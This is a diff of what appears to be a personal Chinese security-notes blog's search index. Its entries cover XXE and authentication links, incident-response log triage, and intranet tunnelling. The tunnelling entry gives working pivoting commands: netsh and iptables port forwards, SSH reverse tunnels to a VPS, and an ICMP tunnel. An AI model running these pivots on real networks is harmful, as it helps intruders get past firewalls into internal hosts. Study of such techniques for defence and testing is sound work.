-<h1 id="SAML-Security-Assertion-Markup-Language-安全断言标记语言"><a href="#SAML-Security-Assertion-Markup-Language-安全断言标记语言" class="headerlink" title="SAML (Security Assertion Markup Language 安全断言标记语言)"></a>SAML (Security Assertion Markup Language 安全断言标记语言)</h1><p>XML格式的语言，使用XML格式交互，来完成SSO的功能<br>摘: <a href="https://www.freebuf.com/articles/system/361055">https://www.freebuf.com/articles/system/361055</a>.<br>(小声逼逼: 最近Gitlab有这个洞，exp未公开)</p>
-<h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p>内网渗透避不开的认证<br>摘: <a href="https://xz.aliyun.com/t/14534">https://xz.aliyun.com/t/14534</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>认证机制与攻击</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xxe漏洞及原理</title>
-    <url>/posts/e69865a1.html</url>
-    <content><![CDATA[<p>这个洞总是学了又忘，第四次了。<br>摘: <a href="https://blog.csdn.net/elephantxiang/article/details/113812331">pikachu XXE (XML外部实体注入)（皮卡丘漏洞平台通关系列）_仙女象的博客-CSDN博客</a><br>摘: <a href="https://lalajun.github.io/2019/12/03/WEB-XXE/">WEB-XXE (lalajun.github.io)</a><br>摘: <a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a><br>摘: <a href="dtd%EF%BC%88%E5%85%83%E7%B4%A0%E5%AE%9A%E4%B9%89%E5%92%8C%E5%B1%9E%E6%80%A7%E5%AE%9A%E4%B9%89%EF%BC%89">https://blog.csdn.net/m0_54546762&#x2F;article&#x2F;details&#x2F;119181068#:~:text&#x3D;二 、元素定义 1引入DTD约束 <!DOCTYPE ROOT []> 2添加元素定义 &lt;!ELEMENT,<!ELEMENT element-name (#PCDATA)> (文本元素) <!ELEMENT element-name (e1,e2)> (混合元素)</a></p>
-]]></content>
-      <tags>
-        <tag>XXE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网隧道搭建</title>
-    <url>/posts/d57d5540.html</url>
-    <content><![CDATA[<h1 id="网络连通性测试"><a href="#网络连通性测试" class="headerlink" title="网络连通性测试"></a>网络连通性测试</h1><h2 id="icmp探测"><a href="#icmp探测" class="headerlink" title="icmp探测"></a>icmp探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 114.114.114.114 -n 1	#Windows</span><br><span class="line">ping 114.114.114.114 -c 1	#Linux</span><br></pre></td></tr></table></figure>
-<h2 id="http探测"><a href="#http探测" class="headerlink" title="http探测"></a>http探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure>
-<h2 id="dns探测"><a href="#dns探测" class="headerlink" title="dns探测"></a>dns探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>
-<h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>服务器可出网<br>反向代理可穿透防火墙<br>cobaltstrike socks代理<br>nps工具</p>
-<h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><h2 id="windows-netsh-端口转发-双网卡"><a href="#windows-netsh-端口转发-双网卡" class="headerlink" title="windows netsh 端口转发 双网卡"></a>windows netsh 端口转发 双网卡</h2><p>netsh仅支持tcp协议，适用于双网卡服务器<br>启动转发</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看已有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">添加转发规则 访问外网ip1234端口即访问内网ip端口3389</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=1234 connectaddress=内网IP connectport=3389 </span><br></pre></td></tr></table></figure>
-<p>取消转发</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=1234</span><br><span class="line"></span><br><span class="line"># xp需安装ipv4</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
-<h2 id="linux-iptables-转发-高权限"><a href="#linux-iptables-转发-高权限" class="headerlink" title="linux iptables 转发 高权限"></a>linux iptables 转发 高权限</h2><p>编辑配置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启IP转发</span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">	net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
-<p>关闭服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure>
-<p>配置规则</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#需要访问的内网地址：10.1.1.11（Windows）</span><br><span class="line">#内网边界web服务器：192.168.100.100（Linux）</span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br></pre></td></tr></table></figure>
-<p>保存并重启服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>
-<h2 id="neo-regeorg端口复用"><a href="#neo-regeorg端口复用" class="headerlink" title="neo-regeorg端口复用"></a>neo-regeorg端口复用</h2><p>下载</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure>
-<h1 id="linux-ssh隧道-高权限"><a href="#linux-ssh隧道-高权限" class="headerlink" title="linux ssh隧道 高权限"></a>linux ssh隧道 高权限</h1><h2 id="本地转发-正向"><a href="#本地转发-正向" class="headerlink" title="本地转发 正向"></a>本地转发 正向</h2><p>vps执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L &lt;VPS监听端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@目标外网Web服务器，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -L 8080:10.1.1.3:3389 root@100.100.1.100</span><br><span class="line"></span><br><span class="line">#VPS上查看8090端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;8090&quot;</span><br><span class="line"></span><br><span class="line">#连接目标内网服务器的远程桌面</span><br><span class="line">VPS-IP:8090</span><br></pre></td></tr></table></figure>
-<h2 id="远程转发-反向"><a href="#远程转发-反向" class="headerlink" title="远程转发 反向"></a>远程转发 反向</h2><p>web服务器执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R &lt;VPS的端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@VPS-IP，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -R 8090:10.1.1.3:3389 root@192.168.0.1</span><br></pre></td></tr></table></figure>
-<h1 id="icmp加密隧道"><a href="#icmp加密隧道" class="headerlink" title="icmp加密隧道"></a>icmp加密隧道</h1><p>icmp可出网</p>
-<p>linux: icmptunnel<br>服务端安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel/</span><br><span class="line">make</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1	#禁用自带的ICMP，两端都要</span><br><span class="line">./icmptunnel -s 							#服务端以root用户监听</span><br><span class="line">(ctrl-z)									</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.1 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
-<p>客户端连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./icmptunnel &lt;server-IP&gt;</span><br><span class="line">(ctrl-z)</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.2 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
-<p>测试ssh连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@10.0.0.1</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Intranet安全</category>
-      </categories>
-      <tags>
-        <tag>内网穿透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>应急响应知识记录</title>
-    <url>/posts/dbfe99cc.html</url>
-    <content><![CDATA[<p>仅作简单应急响应流程</p>
-<h1 id="确认事件类型"><a href="#确认事件类型" class="headerlink" title="确认事件类型"></a>确认事件类型</h1><h2 id="恶意程序"><a href="#恶意程序" class="headerlink" title="恶意程序"></a>恶意程序</h2><p>计算机病毒、特洛伊木马 、勒索软件、蠕虫病毒、僵尸网络程序、挖矿程序等</p>
-<h2 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h2><p>拒绝服务攻击、漏洞攻击、网络钓鱼、后门攻击、网络扫描窃听等</p>
-<h2 id="Web攻击"><a href="#Web攻击" class="headerlink" title="Web攻击"></a>Web攻击</h2><p>WebShell、网页挂马、网页篡改、网页暗链、sql注入等</p>
-<h1 id="windows-排查"><a href="#windows-排查" class="headerlink" title="windows 排查"></a>windows 排查</h1><h2 id="账号排查"><a href="#账号排查" class="headerlink" title="账号排查"></a>账号排查</h2><p>查看服务器是否有弱口令，远程管理端口（rdp，ssh，redis，ftp等）是否对公网开放</p>
-<h2 id="隐藏账户排查"><a href="#隐藏账户排查" class="headerlink" title="隐藏账户排查"></a>隐藏账户排查</h2><p>注册表 local_machine，sam，domains，account，users。<br>names记录用户名称<br>若sam无法打开则赋予注册表管理员权限并需要重新启动注册表</p>
-<h2 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a>日志排查</h2><h3 id="IIS日志排查"><a href="#IIS日志排查" class="headerlink" title="IIS日志排查"></a>IIS日志排查</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\\windows\system32\winevt\logs\</span><br></pre></td></tr></table></figure>
-<p>eventvwr.msc，windows日志，应用程序日志&#x2F;安全日志&#x2F;系统日志。<br>应用程序日志记录应用程序运行过程中的事件和错误信息<br>安全日志4624登录成功，4625登录失败<br>系统日志记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等<br>工具: Log Parser</p>
-<h3 id="web中间件日志排查"><a href="#web中间件日志排查" class="headerlink" title="web中间件日志排查"></a>web中间件日志排查</h3><p>根据中间件查找对应日志<br>apache</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows: Apache安装目录/logslaccess.logerror.logL</span><br><span class="line">Linux:/usr/local/apache/logs/access logerror log</span><br></pre></td></tr></table></figure>
-<p>tomcat</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat安装目录/log/access.log</span><br></pre></td></tr></table></figure>
-<p>nginx</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx安装目录/mginx/access.log</span><br></pre></td></tr></table></figure>
-<p>weblogic</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统日志: Jboss安装目录/server/default/log下</span><br><span class="line">系统启动日志: boot.log</span><br><span class="line">系统当天日志: server.log</span><br><span class="line">历史日志: server..log.日期</span><br><span class="line">记录jboss访问日志: access_log</span><br></pre></td></tr></table></figure>
-<p>工具: EmEditor</p>
-<h2 id="异常端口进程排查"><a href="#异常端口进程排查" class="headerlink" title="异常端口进程排查"></a>异常端口进程排查</h2><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano 查看可疑 ESTABLISHED 连接状态的PID</span><br><span class="line">tasklist | findstr PID 根据可疑进程PID查找进程</span><br></pre></td></tr></table></figure>
-<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>msinfo 查看进程详细信息，进程路径&#x2F;PID&#x2F;创建日期&#x2F;启动时间<br>通过进程查看工具查找可疑子进程<br>没有签名验证信息的进程<br>没有描述信息的进程<br>进程的属主<br>进程的路径是否合法<br>CPU 或内存资源占用长时间过高的进程<br>查杀工具：D盾<br>进程查看工具：process explorer</p>
-<h2 id="启动项-计划任务-服务"><a href="#启动项-计划任务-服务" class="headerlink" title="启动项&#x2F;计划任务&#x2F;服务"></a>启动项&#x2F;计划任务&#x2F;服务</h2><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><p>查看【启动】文件夹<br>msconfig查看启动<br>注册表开机启动项</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure>
-<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at win10已弃用</span><br><span class="line">schtasks</span><br></pre></td></tr></table></figure>
-<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>service.msc检查是否存在可疑自启动服务</p>
-<h1 id="linux-排查"><a href="#linux-排查" class="headerlink" title="linux 排查"></a>linux 排查</h1><h2 id="账户排查"><a href="#账户排查" class="headerlink" title="账户排查"></a>账户排查</h2><p>who     查看当前登录用户（tty 本地登陆  pts 远程登录）<br>w       查看系统信息，某一时刻用户的行为<br>uptime  查看登陆多久、多少用户，负载状态</p>
-<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>etc&#x2F;passwd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆后的 shell</span><br></pre></td></tr></table></figure>
-<h3 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h3><p>etc&#x2F;shadow</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>
-<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><p>history 命令或 .bash_history 文件查看<br>进入用户目录下导出历史命令<br>cat .bash_history &gt;&gt; history.txt</p>
-<h2 id="异常端口-进程"><a href="#异常端口-进程" class="headerlink" title="异常端口&#x2F;进程"></a>异常端口&#x2F;进程</h2><h3 id="端口-1"><a href="#端口-1" class="headerlink" title="端口"></a>端口</h3><p>查看异常网络连接的PID<br>netstat -antlp</p>
-<h3 id="进程-1"><a href="#进程-1" class="headerlink" title="进程"></a>进程</h3><p>对应进程文件路径<br>ls -l &#x2F;proc&#x2F;$PID&#x2F;exe 或 file &#x2F;proc&#x2F;$PID&#x2F;exe<br>分析进程<br>ps aux | grep PID</p>
-<h2 id="开机启动项-定时任务"><a href="#开机启动项-定时任务" class="headerlink" title="开机启动项&#x2F;定时任务"></a>开机启动项&#x2F;定时任务</h2><h3 id="启动项-1"><a href="#启动项-1" class="headerlink" title="启动项"></a>启动项</h3><p>开启启动等级rc*.d<br>默认级别为rc3.d<br>可疑脚本<br>&#x2F;etc&#x2F;init.d<br>软链接<br>&#x2F;etc&#x2F;rc.d&#x2F;rc*.d</p>
-<table>
-<thead>
-<tr>
-<th align="center">运行级别</th>
-<th align="center">含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">0</td>
-<td align="center">关机</td>
-</tr>
-<tr>
-<td align="center">1</td>
-<td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td>
-</tr>
-<tr>
-<td align="center">2</td>
-<td align="center">不完全的命令行模式，不含NFS服务</td>
-</tr>
-<tr>
-<td align="center">3</td>
-<td align="center">完全的命令行模式，就是标准字符界面</td>
-</tr>
-<tr>
-<td align="center">4</td>
-<td align="center">系统保留</td>
-</tr>
-<tr>
-<td align="center">5</td>
-<td align="center">图形模式</td>
-</tr>
-<tr>
-<td align="center">6</td>
-<td align="center">重启动</td>
-</tr>
-</tbody></table>
-<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/rootcrontab -r</span><br><span class="line">删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br></pre></td></tr></table></figure>
-<h2 id="恶意脚本排查"><a href="#恶意脚本排查" class="headerlink" title="恶意脚本排查"></a>恶意脚本排查</h2><p>more &#x2F;etc&#x2F;cron.d&#x2F;* 查看目录下所有文件<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;*<br>&#x2F;etc&#x2F;crontab<br>&#x2F;etc&#x2F;cron.d&#x2F;*<br>&#x2F;etc&#x2F;cron.daily&#x2F;*<br>&#x2F;etc&#x2F;cron.hourly&#x2F;*<br>&#x2F;etc&#x2F;cron.monthly&#x2F;*<br>&#x2F;etc&#x2F;cron.weekly&#x2F;<br>&#x2F;etc&#x2F;anacrontab<br>&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*</p>
-<h2 id="异常文件"><a href="#异常文件" class="headerlink" title="异常文件"></a>异常文件</h2><p>1、查看敏感目录，注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性，可使用ls -l查看<br>2、查找webshell同一时间范围内创建的文件<br>find &#x2F;opt -iname “*” -atime 1 -type f 找出 &#x2F;opt 下一天前访问过的文件</p>
-<h2 id="日志检查"><a href="#日志检查" class="headerlink" title="日志检查"></a>日志检查</h2><table>
-<thead>
-<tr>
-<th align="center">日志文件</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;cron</td>
-<td align="center">记录了系统定时任务相关的日志</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;cups</td>
-<td align="center">记录打印信息的日志</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;dmesg</td>
-<td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;mailog</td>
-<td align="center">记录邮件信息</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;message</td>
-<td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;btmp</td>
-<td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;lastlog</td>
-<td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;wtmp</td>
-<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td>
-<td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
-</tr>
-<tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;secure</td>
-<td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
-</tr>
-</tbody></table>
-<p>爆破主机的root帐号的IP数量：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
-<p>定位爆破的IP：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br></pre></td></tr></table></figure>
-<p>爆破用户名的字典</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">2、登录成功的IP 	</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
-<p>登录成功的日期、用户名、IP：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>应急响应</category>
-      </categories>
-      <tags>
-        <tag>应急响应流程</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>勒索病毒概述与常见攻击手法</title>
     <url>/posts/770d9e62.html</url>
     <content><![CDATA[<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>勒索病毒（Ransomware）是一种恶意软件，它通过加密目标系统上的文件，进而威胁受害者支付赎金才能解锁文件。其工作原理通常分为以下几个阶段：<br>入侵与感染：勒索病毒通过各种手段渗透到目标计算机，并获得执行的权限。<br>加密：一旦病毒在系统中获得执行权限，它会加密文件，使文件无法打开或使用。<br>勒索：加密后，攻击者会使主机显示勒索信息，要求受害者支付赎金才能获取解密密钥。<br>赎金支付：在支付赎金后，受害者可能获得解密密钥（但也不一定能成功解密），也有可能完全无法恢复数据。</p>
@@ -2312,13 +2183,150 @@
 <div class="note info no-icon flat"><p>对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access&#x2F;mdb溢出。</p>
 </div>
 
-<p>搬运自<a href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html">https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html</a></p>
+<p><a href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html">狼组安全团队公开知识库</a></p>
 ]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
       <tags>
         <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应急响应知识记录</title>
+    <url>/posts/dbfe99cc.html</url>
+    <content><![CDATA[<p>仅作简单应急响应流程</p>
+<h1 id="确认事件类型"><a href="#确认事件类型" class="headerlink" title="确认事件类型"></a>确认事件类型</h1><h2 id="恶意程序"><a href="#恶意程序" class="headerlink" title="恶意程序"></a>恶意程序</h2><p>计算机病毒、特洛伊木马 、勒索软件、蠕虫病毒、僵尸网络程序、挖矿程序等</p>
+<h2 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h2><p>拒绝服务攻击、漏洞攻击、网络钓鱼、后门攻击、网络扫描窃听等</p>
+<h2 id="Web攻击"><a href="#Web攻击" class="headerlink" title="Web攻击"></a>Web攻击</h2><p>WebShell、网页挂马、网页篡改、网页暗链、sql注入等</p>
+<h1 id="windows-排查"><a href="#windows-排查" class="headerlink" title="windows 排查"></a>windows 排查</h1><h2 id="账号排查"><a href="#账号排查" class="headerlink" title="账号排查"></a>账号排查</h2><p>查看服务器是否有弱口令，远程管理端口（rdp，ssh，redis，ftp等）是否对公网开放</p>
+<h2 id="隐藏账户排查"><a href="#隐藏账户排查" class="headerlink" title="隐藏账户排查"></a>隐藏账户排查</h2><p>注册表 local_machine，sam，domains，account，users。<br>names记录用户名称<br>若sam无法打开则赋予注册表管理员权限并需要重新启动注册表</p>
+<h2 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a>日志排查</h2><h3 id="IIS日志排查"><a href="#IIS日志排查" class="headerlink" title="IIS日志排查"></a>IIS日志排查</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\\windows\system32\winevt\logs\</span><br></pre></td></tr></table></figure>
+<p>eventvwr.msc，windows日志，应用程序日志&#x2F;安全日志&#x2F;系统日志。<br>应用程序日志记录应用程序运行过程中的事件和错误信息<br>安全日志4624登录成功，4625登录失败<br>系统日志记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等<br>工具: Log Parser</p>
+<h3 id="web中间件日志排查"><a href="#web中间件日志排查" class="headerlink" title="web中间件日志排查"></a>web中间件日志排查</h3><p>根据中间件查找对应日志<br>apache</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows: Apache安装目录/logslaccess.logerror.logL</span><br><span class="line">Linux:/usr/local/apache/logs/access logerror log</span><br></pre></td></tr></table></figure>
+<p>tomcat</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat安装目录/log/access.log</span><br></pre></td></tr></table></figure>
+<p>nginx</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx安装目录/mginx/access.log</span><br></pre></td></tr></table></figure>
+<p>weblogic</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统日志: Jboss安装目录/server/default/log下</span><br><span class="line">系统启动日志: boot.log</span><br><span class="line">系统当天日志: server.log</span><br><span class="line">历史日志: server..log.日期</span><br><span class="line">记录jboss访问日志: access_log</span><br></pre></td></tr></table></figure>
+<p>工具: EmEditor</p>
+<h2 id="异常端口进程排查"><a href="#异常端口进程排查" class="headerlink" title="异常端口进程排查"></a>异常端口进程排查</h2><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano 查看可疑 ESTABLISHED 连接状态的PID</span><br><span class="line">tasklist | findstr PID 根据可疑进程PID查找进程</span><br></pre></td></tr></table></figure>
+<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>msinfo 查看进程详细信息，进程路径&#x2F;PID&#x2F;创建日期&#x2F;启动时间<br>通过进程查看工具查找可疑子进程<br>没有签名验证信息的进程<br>没有描述信息的进程<br>进程的属主<br>进程的路径是否合法<br>CPU 或内存资源占用长时间过高的进程<br>查杀工具：D盾<br>进程查看工具：process explorer</p>
+<h2 id="启动项-计划任务-服务"><a href="#启动项-计划任务-服务" class="headerlink" title="启动项&#x2F;计划任务&#x2F;服务"></a>启动项&#x2F;计划任务&#x2F;服务</h2><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><p>查看【启动】文件夹<br>msconfig查看启动<br>注册表开机启动项</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at win10已弃用</span><br><span class="line">schtasks</span><br></pre></td></tr></table></figure>
+<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>service.msc检查是否存在可疑自启动服务</p>
+<h1 id="linux-排查"><a href="#linux-排查" class="headerlink" title="linux 排查"></a>linux 排查</h1><h2 id="账户排查"><a href="#账户排查" class="headerlink" title="账户排查"></a>账户排查</h2><p>who     查看当前登录用户（tty 本地登陆  pts 远程登录）<br>w       查看系统信息，某一时刻用户的行为<br>uptime  查看登陆多久、多少用户，负载状态</p>
+<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>etc&#x2F;passwd</p>
